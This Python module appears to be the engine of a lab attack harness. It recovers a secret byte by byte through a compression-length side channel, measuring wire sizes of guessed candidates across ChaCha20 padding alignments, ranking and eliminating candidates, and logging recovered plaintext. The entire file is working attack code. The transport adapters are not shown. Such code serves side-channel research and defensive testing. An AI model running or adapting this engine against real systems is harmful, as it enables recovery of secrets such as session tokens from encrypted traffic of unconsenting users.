"""Transport-agnostic engine: round loop, candidate ranking, metrics.

The engine calls adapter.measure_once(prefix, candidate, alignment) for
every oracle query. Everything else lives here.

aiohttp is imported inside run_attack() so pure-logic helpers are usable
on the host (where aiohttp is not installed — only inside the attacker
container).
"""

from __future__ import annotations

import logging
import time
from typing import Any, TYPE_CHECKING

from attacker.attack.adapters.base import Adapter
from attacker.attack.alignment import make_alignment
from attacker.attack.config import AttackConfig, AlignmentMode

if TYPE_CHECKING:
    import aiohttp

LOG = logging.getLogger("attack.engine")


# ---------------------------------------------------------------------------
# Pure-logic helpers (unit-tested)
# ---------------------------------------------------------------------------

def _pick_alignment_with_largest_gap(
    per_nl: dict[int, dict[bytes, int]],
    best: bytes,
) -> int | None:
    """Return the alignment length at which `best` beats every other
    candidate by the most wire bytes, or None if no alignment shows any
    gap (e.g., single-candidate round, or all measurements identical).
    """
    sig_nl: int | None = None
    best_gap = 0
    for nl, vals in per_nl.items():
        if best not in vals:
            continue
        others = [v for c, v in vals.items() if c != best]
        if not others:
            continue
        gap = min(others) - vals[best]
        if gap > best_gap:
            best_gap = gap
            sig_nl = nl
    return sig_nl


def _select_initial_alignment(
    config: AttackConfig,
    prev_nl: int | None,
) -> list[int]:
    if config.alignment_mode == AlignmentMode.FIXED_SINGLE:
        return [config.alignment_lengths[0]]
    if config.alignment_hint_carryover and prev_nl is not None:
        if prev_nl in config.alignment_lengths:
            return [prev_nl]
    return list(config.alignment_lengths)


# ---------------------------------------------------------------------------
# Per-position recovery
# ---------------------------------------------------------------------------

async def crack_byte_position(
    adapter: Adapter,
    config: AttackConfig,
    prefix: bytes,
    initial_alignment: list[int],
    log_prefix: str,
) -> tuple[bytes, dict[str, Any]]:
    sums: dict[bytes, int] = {c: 0 for c in config.alphabet}
    active_candidates = list(config.alphabet)
    active_alignment = list(initial_alignment)
    guesses = 0
    prev_margin = 0
    stall_count = 0

    # Chacha20's padding modulus, recovered from the configured set.
    # Matches the original code's `noise_lengths[-1] + 1`.
    n = max(config.alignment_lengths) + 1

    per_nl: dict[int, dict[bytes, int]] = {}
    best: bytes = active_candidates[0]
    margin = 0
    rnd = 0

    for rnd in range(1, config.max_rounds + 1):
        # One round with outlier-retry. If outlier_threshold == 0 we take
        # the first pass unconditionally.
        while True:
            per_nl = {nl: {} for nl in active_alignment}
            for nl in active_alignment:
                alignment = make_alignment(nl)
                for c in active_candidates:
                    guesses += 1
                    per_nl[nl][c] = await adapter.measure_once(prefix, c, alignment)
            flat = [v for m in per_nl.values() for v in m.values()]
            if (
                config.outlier_threshold == 0
                or not flat
                or max(flat) - min(flat) <= config.outlier_threshold
            ):
                break
            LOG.info(
                "%s round=%d outlier min=%d max=%d (threshold=%d), retry",
                log_prefix, rnd, min(flat), max(flat), config.outlier_threshold,
            )

        for c in active_candidates:
            sums[c] += sum(per_nl[nl][c] for nl in active_alignment)
        ranked = sorted(active_candidates, key=lambda c: sums[c])
        best = ranked[0]
        second_sum = sums[ranked[1]] if len(ranked) > 1 else sums[best]
        margin = second_sum - sums[best]
        eliminated = 0

        if config.candidate_elimination:
            before = len(active_candidates)
            active_candidates = [
                c for c in ranked if sums[c] - sums[best] < config.min_margin
            ]
            if len(active_candidates) < 2:
                active_candidates = ranked[:2]
            eliminated = before - len(active_candidates)

        if config.adaptive_alignment and rnd == 1:
            productive = {
                nl for nl, m in per_nl.items() if min(m.values()) < max(m.values())
            }
            if productive:
                keep: set[int] = set()
                for nl in productive:
                    keep.add(nl)
                    keep.add((nl - 1) % n)
                    keep.add((nl + 1) % n)
                new_alignment = sorted(keep & set(config.alignment_lengths))
                if len(new_alignment) >= 3:
                    active_alignment = new_alignment

        if config.stall_detection:
            if margin <= prev_margin and eliminated == 0:
                stall_count += 1
            else:
                stall_count = 0
            prev_margin = margin
            if stall_count >= 2 and len(active_alignment) < len(config.alignment_lengths):
                expanded = set(active_alignment)
                for nl in list(expanded):
                    expanded.add((nl - 1) % n)
                    expanded.add((nl + 1) % n)
                active_alignment = sorted(expanded & set(config.alignment_lengths))
                stall_count = 0
                LOG.info("%s round=%d stall, expanding alignment", log_prefix, rnd)

        LOG.info(
            "%s round=%d best=%r sum=%d 2nd=%d margin=%d alive=%d align=%d",
            log_prefix, rnd, best.decode("latin-1"), sums[best],
            second_sum, margin, len(active_candidates), len(active_alignment),
        )
        if margin >= config.min_margin:
            break
    else:
        LOG.warning(
            "%s exhausted %d rounds, margin=%d (threshold=%d)",
            log_prefix, config.max_rounds, margin, config.min_margin,
        )

    successful_alignment = _pick_alignment_with_largest_gap(per_nl, best)
    ranked_all = sorted(config.alphabet, key=lambda c: sums[c])
    return best, {
        "position": log_prefix,
        "best": best.decode("latin-1"),
        "guesses": guesses,
        "rounds": rnd,
        "final_margin": margin,
        "successful_alignment": successful_alignment,
        "ranked_top5": [
            (c.decode("latin-1"), sums[c]) for c in ranked_all[:5]
        ],
    }


# ---------------------------------------------------------------------------
# Full attack
# ---------------------------------------------------------------------------

async def run_attack(
    adapter: Adapter,
    config: AttackConfig,
) -> dict[str, Any]:
    import aiohttp  # local import — not needed for host-side helper tests

    LOG.info(
        "run_attack: variant=%s label=%r prefix=%r alphabet=%d max_len=%d "
        "mode=%s lengths=%s min_margin=%d max_rounds=%d",
        adapter.__class__.__name__, config.label,
        config.known_prefix, len(config.alphabet), config.max_length,
        config.alignment_mode.value, config.alignment_lengths,
        config.min_margin, config.max_rounds,
    )
    started = time.time()

    timeout = aiohttp.ClientTimeout(total=7200)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        await adapter.setup(config, session)
        try:
            recovered = b""
            per_position: list[dict[str, Any]] = []
            prev_nl: int | None = None

            for pos in range(config.max_length):
                full_prefix = config.known_prefix + recovered
                if config.constant_prefix_trim:
                    trim = max(0, len(full_prefix) - len(config.known_prefix))
                    full_prefix = full_prefix[trim:]

                initial_alignment = _select_initial_alignment(config, prev_nl)
                best, pos_info = await crack_byte_position(
                    adapter=adapter,
                    config=config,
                    prefix=full_prefix,
                    initial_alignment=initial_alignment,
                    log_prefix=f"pos {pos:2d}",
                )
                pos_info["position"] = pos
                per_position.append(pos_info)
                prev_nl = pos_info["successful_alignment"]

                if best == config.terminator:
                    LOG.info("hit terminator at position %d -> done", pos)
                    break
                recovered += best
                LOG.info("recovered so far: %r", recovered.decode("latin-1"))
            else:
                LOG.warning("hit max_length=%d without terminator", config.max_length)
        finally:
            await adapter.teardown()

    elapsed = time.time() - started
    LOG.info("run_attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "total_guesses": sum(p["guesses"] for p in per_position),
        "per_position": per_position,
        "config_label": config.label,
    }
